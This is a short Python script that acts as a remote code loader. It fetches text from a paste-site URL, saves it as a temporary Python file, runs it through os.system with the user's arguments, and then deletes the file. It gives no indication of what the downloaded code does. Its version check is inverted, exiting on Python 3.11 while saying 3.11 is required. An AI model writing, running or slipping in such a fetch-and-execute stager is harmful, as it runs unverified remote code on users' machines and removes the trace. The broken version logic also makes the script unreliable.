import sys
from requests import get
from os import system, remove
from tempfile import NamedTemporaryFile

if sys.version_info == (3, 11):
    print("This script requires Python 3.11")
    sys.exit(1)

def fetch_code():
    try:
        code = get("https://paste-weld-seven.vercel.app/raw/hXe5Qi")
        return code.text
    except Exception as e:
        print(f"Error fetching code: {e}")
        sys.exit(1)

def main():
    try:
        code = fetch_code()
        with NamedTemporaryFile("w", delete=False, suffix=".py") as t_file:
            t_file.write(code)
            file_name = t_file.name
        system(" ".join([sys.executable, file_name] + sys.argv[1:]))
    except Exception as e:
        print(f"Error executing code: {e}")
        sys.exit(1)
    finally:
        if "file_name" in locals():
            remove(file_name)

if __name__ == "__main__":
    main()